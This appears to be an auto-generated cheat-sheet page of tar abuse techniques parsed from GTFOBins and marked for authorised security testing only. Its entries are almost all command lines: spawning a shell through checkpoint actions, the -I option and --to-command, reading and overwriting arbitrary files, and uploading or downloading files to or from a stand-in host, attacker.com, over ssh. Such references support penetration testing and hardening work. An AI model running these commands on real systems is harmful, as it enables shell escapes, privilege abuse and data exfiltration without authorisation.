---
parsed_by: focuslocust
source: commands
type: generated
---
# tar Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## tar

Tool page: [tar](../../tools/linux/tar.md)

### download

```text
tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tar` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
tar cf /dev/stdout /path/to/input-file -I 'tar xO'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tar` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
echo DATA >/path/to/temp-file
tar cf /path/to/temp-file.tar /path/to/temp-file
tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tar` |
| Evidence | Function example preserved from source parser. |

### shell

```text
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tar` |
| Evidence | Function example preserved from source parser. |

### shell

```text
tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tar` |
| Evidence | Function example preserved from source parser. |

### shell

```text
echo '/bin/sh 0<&1' >/path/to/temp-file
tar cf /path/to/temp-file.tar /path/to/temp-file
tar xf /path/to/temp-file.tar --to-command /bin/sh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tar` |
| Evidence | Function example preserved from source parser. |

### upload

```text
tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tar` |
| Evidence | Function example preserved from source parser. |
